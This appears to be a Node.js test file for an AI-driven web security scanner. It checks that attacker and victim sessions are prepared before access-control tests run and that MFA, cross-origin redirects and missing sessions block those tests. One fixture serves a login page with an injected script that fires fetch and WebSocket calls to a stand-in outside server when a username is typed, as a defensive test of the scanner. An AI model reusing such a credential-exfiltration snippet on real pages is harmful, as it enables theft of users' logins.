import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import {once} from 'node:events';
import {database} from '../mobile-closure/fixtures.mjs';
import {AIScanRepository} from '../../server/src/services/ai-scan/repository.ts';
import {AIScanAgentRuntime} from '../../server/src/agent/agent-runtime.ts';
import {buildProductAssessmentState} from '../../server/src/services/ai-scan/product-state-service.ts';
import {identityHeaders} from '../../server/src/services/ai-scan/identity-material.ts';
import {resolveTaskEndpointPlan} from '../../server/src/services/ai-scan/task-endpoint-plan.ts';
import {discoverWebPages} from '../../server/src/services/ai-scan/browser/web-discovery.ts';
import {closePersistentBrowserContextsForScan} from '../../server/src/services/ai-scan/browser/persistent-browser-runtime.ts';

// Real scheduler, SQLite, registry, saved account login and scoped HTTP. Only
// the planner protocol and final security analysis are fixtures, not a live target.
async function fixture(t, mode = 'success', config = {}) {
  const db=await database(), repo=new AIScanRepository(db), posts=[], executed=[], modelTasks=[];
  t.after(async()=>{await closePersistentBrowserContextsForScan(repo,run.id);await db.disconnect();});
  let outsideCalls=0;
  const outside=http.createServer((_req,res)=>{outsideCalls++;res.end('outside');});
  outside.listen(0,'127.0.0.1');await once(outside,'listening');
  const outsideOrigin=`http://127.0.0.1:${outside.address().port}`;
  const outsideSocketOrigin=outsideOrigin.replace(/^http:/,'ws:');
  outside.on('upgrade',(_req,socket)=>{outsideCalls++;socket.destroy();});
  t.after(()=>new Promise(resolve=>{outside.closeAllConnections();outside.close(resolve);}));
  const target=http.createServer(async(req,res)=>{
    res.setHeader('content-type','text/html');
    if(req.url==='/owned'){
      res.setHeader('content-type','application/json');res.end(JSON.stringify({session:req.headers.cookie||''}));return;
    }
    if(req.method==='POST'){
      let raw='';for await(const chunk of req)raw+=chunk;
      const form=new URLSearchParams(raw),role=form.get('username');posts.push(role);
      assert.equal(form.get('password'),`fixture-${role}`);
      if(mode==='cross_origin'){res.writeHead(302,{location:`${outsideOrigin}/login`});res.end();return;}
      if(mode==='post_mfa'){res.end('<form action="/verify"><input name="otp"></form>');return;}
      if(mode==='partial'&&role==='victim'){res.statusCode=401;res.end('invalid login');return;}
      if(mode!=='no_session')res.setHeader('set-cookie',`sid=${role}-session; Path=/; HttpOnly`);
      res.end('<h1>dashboard</h1><a href="/logout">logout</a>');return;
    }
    if(req.url==='/logout'){res.statusCode=404;res.end('not found');return;}
    if(mode==='no_form'){res.end('<main>Public content</main>');return;}
    res.setHeader('set-cookie','csrf=prelogin-only; Path=/');
    const credentialExfiltration=mode==='credential_exfiltration'?`<script>
      const external=${JSON.stringify(outsideOrigin)}, socket=${JSON.stringify(outsideSocketOrigin)};
      const capturedSocket=globalThis.WebSocket;
      document.querySelector('[name=username]').addEventListener('input',()=>{
        fetch(external+'/credential-window-fetch',{method:'POST'}).catch(()=>{});
        try { new capturedSocket(socket+'/credential-window-socket'); } catch {}
      });
    </script>`:'';
    res.end(`<form method="POST" action="/login"><input name="username"><input type="password" name="password">${mode==='mfa'?'<input name="otp">':''}<button>Login</button></form>${credentialExfiltration}`);
  });
  target.listen(0,'127.0.0.1');await once(target,'listening');
  t.after(()=>new Promise(resolve=>{target.closeAllConnections();target.close(resolve);}));
  const base=`http://127.0.0.1:${target.address().port}/`;
  const run=await repo.createRun({base_url:base,scan_config:{surface:'web',account_mode:'manual',account_bootstrap_max_pages:1,
    accounts:{attacker:{username:'attacker',password:'fixture-attacker'},victim:{username:'victim',password:'fixture-victim'}},...config}});
  const discovery=await repo.createTask({scan_run_id:run.id,title:'Discover fixture',task_type:'autonomous_agent_task',priority:10,execution_plan:{intent:'discover_target'}});
  const task=await repo.createTask({scan_run_id:run.id,title:'Role fixture test',task_type:'test_generic_vuln',priority:30,vuln_type:'bola_idor',
    execution_plan:{requires_identity_context:true}});
  const provider=http.createServer(async(req,res)=>{
    let raw='';for await(const chunk of req)raw+=chunk;
    const context=JSON.parse(JSON.parse(raw).messages.find(message=>message.role==='user').content).context;
    modelTasks.push(context.task.execution_plan?.intent||context.task.task_type);
    const decision=context.task.task_type==='test_generic_vuln'&&!context.task_tool_invocations.length
      ?{action:'tool_call',tool_name:'bstg.generic_vuln.run_test',arguments:{}}
      :{action:'complete_task',summary:'Fixture task complete; no security verdict.'};
    res.setHeader('content-type','application/json');
    res.end(JSON.stringify({id:'identity-fixture',model:'contract-model',choices:[{message:{role:'assistant',content:JSON.stringify(decision)}}]}));
  });
  provider.listen(0,'127.0.0.1');await once(provider,'listening');
  t.after(()=>new Promise(resolve=>{provider.closeAllConnections();provider.close(resolve);}));
  await db.runRawQuery('INSERT INTO ai_providers (id,name,provider_type,base_url,api_key,model,is_enabled,is_default) VALUES (?,?,?,?,?,?,?,?)',
    ['fixture','Local protocol fixture','openai_compat',`http://127.0.0.1:${provider.address().port}/v1`,'fixture','contract-model',1,1]);
  const runtime=new AIScanAgentRuntime(db);
  runtime.registry.tools.get('bstg.generic_vuln.run_test').handler=async(_input,context)=>{
    const accounts=(await db.repos.accounts.findAll()).filter(account=>account.tags.includes(`scan:${run.id}`));
    const material=[];
    for(const role of ['attacker','victim']){
      const account=accounts.find(account=>account.tags.includes(`role:${role}`));
      if(account){const response=await fetch(`${base}owned`,{headers:identityHeaders(account.fields)});material.push((await response.json()).session);}
    }
    executed.push({task:context.taskId,material});
    return {ok:true,data:{fixture:true},summary:'Fixture consumed saved role sessions; no vulnerability verdict.'};
  };
  return {db,repo,run,task,discovery,runtime,posts,executed,modelTasks,outsideCalls:()=>outsideCalls};
}
function preparation(snapshot){return snapshot.tasks.find(task=>task.execution_plan?.intent==='prepare_manual_identity');}
function resultArtifact(snapshot){return snapshot.artifacts.find(item=>item.task_id===preparation(snapshot).id&&item.artifact_type==='account_auto_bootstrap_result');}

for(const parallel of [1,3])test(`manual credentials are logged in before a model can dispatch BOLA (${parallel} workers)`,async t=>{
  const f=await fixture(t);
  await f.runtime.bootstrapRun(f.run);await f.runtime.bootstrapRun(f.run);
  const {snapshot}=await f.runtime.run(f.run.id,{max_parallel_agents:parallel});
  const prep=preparation(snapshot);
  assert.equal(snapshot.tasks.filter(task=>task.task_type==='prepare_identity').length,1);
  assert.deepEqual(prep.dependencies,[f.discovery.id]);
  assert.ok(snapshot.tasks.find(task=>task.id===f.task.id).dependencies.includes(prep.id));
  assert.equal(prep.status,'completed');assert.equal(resultArtifact(snapshot).content_json.closure_state,'closed');
  assert.deepEqual(f.posts,['attacker','victim']);
  assert.equal(f.executed.length,1);assert.deepEqual(f.executed[0].material,['csrf=prelogin-only; sid=attacker-session','csrf=prelogin-only; sid=victim-session']);
  assert.ok(!f.modelTasks.includes('prepare_manual_identity'),'model cannot skip deterministic preparation');
  assert.equal(snapshot.shared_resources.filter(item=>item.resource_type==='identity_pool').length,1);
  assert.equal((await f.db.runRawQuery('SELECT count(*) AS n FROM findings'))[0].n,0);assert.equal(buildProductAssessmentState(snapshot).totals.confirmed_risks,0);
  assert.ok(snapshot.tasks.every(task=>!['running','pending'].includes(task.status)));
});

for(const mode of ['mfa','post_mfa','partial','cross_origin','no_session','no_form'])test(`manual preparation records ${mode} and prevents unauthenticated BOLA dispatch`,async t=>{
  const f=await fixture(t,mode),{snapshot}=await f.runtime.run(f.run.id,{max_parallel_agents:3});
  assert.equal(f.executed.length,0);assert.equal(f.outsideCalls(),0);
  const task=snapshot.tasks.find(item=>item.id===f.task.id);
  assert.equal(task.status,'blocked');assert.equal(task.phase,'identity_required');
  assert.equal(snapshot.run.status,'failed');assert.equal((await f.db.runRawQuery('SELECT count(*) AS n FROM findings'))[0].n,0);
  assert.notEqual(resultArtifact(snapshot).content_json.closure_state,'closed');
  assert.ok(snapshot.artifacts.some(item=>item.artifact_type==='human_input_request'));
  assert.ok(snapshot.artifacts.some(item=>item.artifact_type==='identity_precondition_blocked'));
  assert.equal(buildProductAssessmentState(snapshot).totals.confirmed_risks,0);
  if(mode==='mfa')assert.equal(f.posts.length,0);
  if(mode==='cross_origin')assert.ok(resultArtifact(snapshot).content_json.blockers.every(item=>item.reason==='authentication_scope_blocked'));
  if(['mfa','post_mfa'].includes(mode))assert.ok(resultArtifact(snapshot).content_json.blockers.every(item=>item.reason==='otp_captcha_mfa_field_present'));
});

test('already observed role sessions are reused without replaying login or replacing object fields',async t=>{
  const f=await fixture(t);
  for(const role of ['attacker','victim'])await f.db.repos.accounts.create({name:role,username:role,status:'active',
    tags:['ai_scan',`scan:${f.run.id}`,`role:${role}`],fields:{role,authorization:`Bearer observed-${role}`,object_id:`owned-${role}`},variables:{},auth_profile:{}});
  const {snapshot}=await f.runtime.run(f.run.id);
  assert.equal(f.posts.length,0);assert.equal(f.executed.length,1);
  assert.equal(resultArtifact(snapshot).content_json.closure_state,'closed');
  assert.equal((await f.db.repos.accounts.findAll()).length,2);
});

test('supplied session material is bound to the scan without inventing credentials',async t=>{
  const f=await fixture(t,'no_form',{accounts:{attacker:{cookie:'sid=supplied-attacker'},victim:{auth_token:'supplied-victim'}}});
  const {snapshot}=await f.runtime.run(f.run.id);
  assert.equal(f.posts.length,0);assert.equal(f.executed.length,1);
  assert.equal(resultArtifact(snapshot).content_json.closure_state,'closed');
  assert.ok((await f.db.repos.accounts.findAll()).every(account=>account.fields.password===''));
});

test('direct tool entry cannot bypass preparation using only account configuration',async t=>{
  const f=await fixture(t);
  const result=await f.runtime.registry.call('bstg.generic_vuln.run_test',{}, {db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:f.task.id});
  assert.equal(result.ok,false);assert.equal(result.data.error_code,'identity_preparation_required');assert.equal(f.executed.length,0);
});

test('partial preparation retains valid attacker material but never substitutes it for another role',async t=>{
  const f=await fixture(t,'partial');await f.runtime.run(f.run.id);
  const publicTask=await f.repo.createTask({scan_run_id:f.run.id,title:'Post-auth XSS fixture',task_type:'test_generic_vuln',vuln_type:'xss',execution_plan:{requires_identity_context:true}});
  const result=await f.runtime.registry.call('bstg.generic_vuln.run_test',{}, {db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:publicTask.id});
  assert.equal(result.ok,true);assert.equal(f.executed.length,1);assert.equal(f.executed[0].material.length,1);
});

test('Android account lifecycle is not replaced by Web login preparation',async t=>{
  const f=await fixture(t,'no_form',{surface:'android'});await f.runtime.bootstrapRun(f.run);
  assert.ok(!(await f.repo.listTasks(f.run.id)).some(task=>task.execution_plan?.intent==='prepare_manual_identity'));
});

for(const source of ['accounts','identities'])for(const ready of [false,true])test(`campaign expansion uses actual session readiness (${ready}) with ${source}`,async t=>{
  const accounts={attacker:{username:'attacker',password:'fixture-attacker'},victim:{username:'victim',password:'fixture-victim'}};
  const f=await fixture(t,'success',source==='identities'?{accounts:{},identities:accounts}:{accounts});
  await f.repo.updateTask(f.discovery.id,{status:'completed'});
  await f.repo.updateTask(f.task.id,{status:'completed'});
  if(ready)for(const role of ['attacker','victim'])await f.db.repos.accounts.create({name:role,username:role,status:'active',tags:['ai_scan',`scan:${f.run.id}`,`role:${role}`],fields:{auth_token:`session-${role}`},variables:{},auth_profile:{}});
  const endpoint=await f.repo.upsertEndpoint({scan_run_id:f.run.id,method:'GET',path:'/api/orders/detail',url:`${f.run.base_url}api/orders/detail?id=owned`,source_type:'browser_network',auth_required:true});
  await f.repo.saveCapturedRequest(endpoint,{method:'GET',url:endpoint.url,headers:{},body:'',response_status:200,source:'browser',captured_at:new Date().toISOString()});
  await f.repo.createCandidate({scan_run_id:f.run.id,vuln_type:'bola_idor',title:'Owned object detail',endpoint_ids:[endpoint.id],confidence:0.9});
  const result=await f.runtime.registry.call('task.expand_selected_vulnerabilities',{selected_vuln_types:['bola_idor']},{db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:f.discovery.id});
  assert.equal(result.ok,true);assert.equal(result.data.deferred,true);
  assert.ok(!(await f.repo.listTasks(f.run.id)).some(task=>task.task_type==='test_generic_vuln'&&task.id!==f.task.id));
  if(!ready)await f.repo.updateRun(f.run.id,{scan_config:{...f.run.scan_config,[source]:{attacker:{username:'attacker'},victim:{username:'victim'}}}});
  const {snapshot}=await f.runtime.run(f.run.id);
  const tasks=snapshot.tasks,prep=preparation({tasks});
  const child=tasks.find(task=>task.task_type==='test_generic_vuln'&&task.id!==f.task.id);
  assert.ok(child);assert.deepEqual(child.dependencies,[prep.id]);
  const sessions=child.execution_plan.workflow_execution_plan.preconditions.filter(item=>item.name==='session');
  assert.ok(sessions.length);
  assert.equal(sessions.some(item=>item.satisfied_by==='configured_identity_pool'),ready);
  assert.ok(!(await f.repo.findRunnablePendingTasks(f.run.id,100)).some(task=>task.id===child.id));
  assert.equal(tasks.find(task=>task.id===result.data.expansion_task_id).status,'completed');
  assert.ok(!f.modelTasks.includes('expand_selected_vulnerabilities'),'deferred expansion cannot be skipped by the model');
});

test('an earlier manual bootstrap result is reused without replaying login attempts',async t=>{
  const f=await fixture(t,'mfa');
  await f.runtime.registry.call('bstg.identity.bootstrap_accounts',{}, {db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:f.discovery.id});
  const {snapshot}=await f.runtime.run(f.run.id);
  assert.ok(resultArtifact(snapshot).content_json.reused_artifact_id);
  assert.equal(snapshot.artifacts.filter(item=>item.artifact_type==='human_input_request').length,1);
  assert.equal(f.posts.length,0);assert.equal(f.executed.length,0);
});

test('a tool vulnerability override cannot downgrade an existing role-sensitive task',async t=>{
  const f=await fixture(t);
  const result=await f.runtime.registry.call('bstg.generic_vuln.run_test',{vuln_type:'xss'},{db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:f.task.id});
  assert.equal(result.ok,false);assert.deepEqual(result.data.required_roles,['attacker','victim']);assert.equal(f.executed.length,0);
});

test('observed authenticated endpoints require a session even without a model-supplied precondition',async t=>{
  const f=await fixture(t);
  const endpoint=await f.repo.upsertEndpoint({scan_run_id:f.run.id,method:'GET',url:`${f.run.base_url}owned`,path:'/owned',auth_required:true,source_type:'browser_network'});
  const task=await f.repo.createTask({scan_run_id:f.run.id,title:'Endpoint fixture',task_type:'autonomous_agent_task'});
  const result=await f.runtime.registry.call('bstg.generic_vuln.run_test',{vuln_type:'xss',endpoint_id:endpoint.id},{db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:task.id});
  assert.equal(result.ok,false);assert.deepEqual(result.data.required_roles,['attacker']);assert.equal(f.executed.length,0);
});

for(const accounts of [undefined,{}])test(`manual identities alias receives preparation and role session gate with ${accounts?'empty':'absent'} accounts`,async t=>{
  const f=await fixture(t,'success',{accounts,identities:{attacker:{username:'attacker',password:'fixture-attacker'},victim:{username:'victim',password:'fixture-victim'}}});
  const blocked=await f.runtime.registry.call('bstg.generic_vuln.run_test',{}, {db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:f.task.id});
  assert.equal(blocked.ok,false);assert.equal(blocked.data.error_code,'identity_preparation_required');
  // The direct gate invocation is evidence, not a test attempt. Use a fresh task
  // so the planner fixture still requests its first native test invocation.
  await f.repo.updateTask(f.task.id,{status:'completed'});
  const child=await f.repo.createTask({scan_run_id:f.run.id,title:'Alias fixture',task_type:'test_generic_vuln',vuln_type:'bola_idor'});
  const {snapshot}=await f.runtime.run(f.run.id);
  assert.equal(resultArtifact(snapshot).content_json.closure_state,'closed');
  assert.deepEqual(f.posts,['attacker','victim']);assert.equal(f.executed.length,1);
  assert.deepEqual(f.executed[0].material,['csrf=prelogin-only; sid=attacker-session','csrf=prelogin-only; sid=victim-session']);
  assert.deepEqual(snapshot.tasks.find(task=>task.id===child.id).dependencies,[preparation(snapshot).id]);
});

for(const mode of ['mfa','partial'])test(`empty accounts cannot bypass an identities alias ${mode} blocker`,async t=>{
  const f=await fixture(t,mode,{accounts:{},identities:{attacker:{username:'attacker',password:'fixture-attacker'},victim:{username:'victim',password:'fixture-victim'}}});
  const {snapshot}=await f.runtime.run(f.run.id,{max_parallel_agents:3});
  assert.equal(f.executed.length,0);assert.equal(snapshot.run.status,'failed');
  assert.equal(snapshot.tasks.find(task=>task.id===f.task.id).status,'blocked');
  const blocked=snapshot.artifacts.find(item=>item.artifact_type==='identity_precondition_blocked');
  assert.deepEqual(blocked.content_json.required_roles,['attacker','victim']);
  assert.deepEqual(blocked.content_json.missing_roles,mode==='partial'?['victim']:['attacker','victim']);
  assert.notEqual(resultArtifact(snapshot).content_json.closure_state,'closed');
});

test('nonempty accounts retain priority without merging privileged identities from the alias',async t=>{
  const f=await fixture(t,'success',{identities:{attacker:{cookie:'sid=alias-attacker'},admin:{cookie:'sid=alias-admin'}}});
  await f.repo.updateTask(f.task.id,{vuln_type:'bfla'});
  const {snapshot}=await f.runtime.run(f.run.id);
  assert.deepEqual(f.posts,['attacker','victim']);assert.equal(f.executed.length,0);
  const blocked=snapshot.artifacts.find(item=>item.artifact_type==='identity_precondition_blocked');
  assert.deepEqual(blocked.content_json.missing_roles,['admin']);
  const accounts=await f.db.repos.accounts.findAll();
  assert.equal(accounts.length,2);assert.ok(accounts.every(account=>!account.tags.includes('role:admin')));
});

test('shared identity pool and legacy task planning preserve an alias behind empty accounts',async t=>{
  const identities={attacker:{cookie:'sid=supplied-attacker'},victim:{auth_token:'supplied-victim'}};
  const f=await fixture(t,'no_form',{accounts:{},identities});
  const result=await f.runtime.registry.call('agent.shared_context.prepare',{}, {db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:f.task.id});
  assert.equal(result.ok,true);
  const pool=(await f.repo.listSharedResources(f.run.id)).find(item=>item.resource_type==='identity_pool');
  assert.deepEqual(pool.content_json.configured_accounts,identities);assert.equal(pool.content_json.input_modes.manual_accounts,true);
  const endpoint=await f.repo.upsertEndpoint({scan_run_id:f.run.id,method:'GET',path:'/owned',url:`${f.run.base_url}owned`,auth_required:true,source_type:'browser_network'});
  await f.repo.updateTask(f.task.id,{endpoint_ids:[endpoint.id]});
  const {plan}=await resolveTaskEndpointPlan({repo:f.repo,scanRunId:f.run.id,taskId:f.task.id});
  assert.ok(plan.preconditions.some(item=>item.name==='session'&&item.satisfied_by==='configured_identity_pool'));
  // A configured plan still cannot substitute for scan-bound prepared sessions.
  const blocked=await f.runtime.registry.call('bstg.generic_vuln.run_test',{}, {db:f.db,repo:f.repo,scanRunId:f.run.id,taskId:f.task.id});
  assert.equal(blocked.data.error_code,'identity_preparation_required');assert.equal(f.executed.length,0);
});

test('browser discovery logs in identities behind empty accounts in separate role contexts',{timeout:30000},async t=>{
  const f=await fixture(t,'success',{accounts:{},identities:{attacker:{username:'attacker',password:'fixture-attacker'},victim:{username:'victim',password:'fixture-victim'}},max_browser_pages:1});
  await discoverWebPages(f.db,f.repo,f.run,f.discovery.id);
  assert.deepEqual(f.posts,['attacker','victim']);
  const accounts=await f.db.repos.accounts.findAll();
  assert.equal(accounts.length,2);
  for(const role of ['attacker','victim']){
    const account=accounts.find(item=>item.tags.includes(`role:${role}`));
    assert.ok(account.tags.includes(`scan:${f.run.id}`));
    assert.equal(identityHeaders(account.fields).cookie,undefined,'browser sessions stay in the persistent browser context, not account fields');
    assert.equal(account.fields.auth_token,undefined);
    assert.equal(account.fields.token,undefined);
    assert.equal(account.fields.cookies,undefined);
  }
  const contexts=await f.repo.listBrowserContexts(f.run.id);
  for(const role of ['attacker','victim']){
    const context=contexts.find(item=>item.scope_type==='identity'&&item.identity_key===role&&item.status==='active');
    assert.equal(context?.storage_state_present,true,`the ${role} authenticated browser context is retained privately`);
    assert.ok(context.storage_cookie_count>0,'only cookie metadata, never values, is exposed by the context list');
  }
  const coverage=(await f.repo.listArtifacts(f.run.id)).find(item=>item.artifact_type==='web_discovery_coverage');
  assert.equal(coverage.content_json.authenticated_identities,2);
});

test('browser discovery installs the prepared-credential boundary before login scripts can retain an external WebSocket',{timeout:30000},async t=>{
  const f=await fixture(t,'credential_exfiltration',{accounts:{attacker:{username:'attacker',password:'fixture-attacker'}},max_browser_pages:1});
  await discoverWebPages(f.db,f.repo,f.run,f.discovery.id);
  assert.deepEqual(f.posts,[],'a blocked credential window must not submit the login form');
  assert.equal(f.outsideCalls(),0,'pre-navigation credential protection blocks fetch and a WebSocket captured by login-page code');
  assert.equal((await f.db.repos.accounts.findAll()).length,0);
});

test('BFLA never treats a victim session as the missing privileged role',async t=>{
  const f=await fixture(t);await f.repo.updateTask(f.task.id,{vuln_type:'bfla'});
  const {snapshot}=await f.runtime.run(f.run.id);
  const blocked=snapshot.artifacts.find(item=>item.artifact_type==='identity_precondition_blocked');
  assert.deepEqual(blocked.content_json.required_roles,['attacker','admin']);
  assert.deepEqual(blocked.content_json.missing_roles,['admin']);assert.equal(f.executed.length,0);
  assert.equal(snapshot.tasks.find(item=>item.id===f.task.id).status,'blocked');
});
